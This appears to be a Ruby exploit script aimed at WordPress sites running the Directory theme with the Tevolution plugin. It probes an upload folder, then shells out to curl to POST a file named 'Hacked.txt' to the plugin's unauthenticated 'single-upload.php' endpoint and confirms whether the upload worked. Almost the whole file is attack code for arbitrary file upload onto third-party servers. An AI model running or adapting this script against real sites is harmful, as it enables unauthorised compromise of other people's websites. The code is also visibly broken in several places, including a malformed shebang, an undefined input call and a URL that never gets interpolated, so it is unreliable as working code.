#!usr/bin/env ruby
require 'net/http'
require 'colorize'
require 'date'
list = get.chomp
File.open("x.txt").each do |line| puts line

x = DateTime.now
x.strftime("%d/%m/%Y")
puts "starting at", x 
puts""
url = gets.chomp
response = nil
puts"Checking #{url}".blue
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('/wp-content/themes/Directory/images/tmp/')
}
if response == "200"
	then puts "[Vuln]".green
else
	puts"[Not Vuln]".red
    puts"check path 127.0.0.1/wordpress/ or 127.0.0.1/wp/ ...".yellow
end
system 'curl -k -X POST -F "file=@./Hacked.txt" #{url}/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php'
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('wp-content/themes/Directory/images/tmp/Hacked.txt')
}
if response == "200"
	then puts "./Done #{url}/wp-content/themes/Directory/images/tmp/Hacked.txt".green
else puts "Failed to upload".red
end
end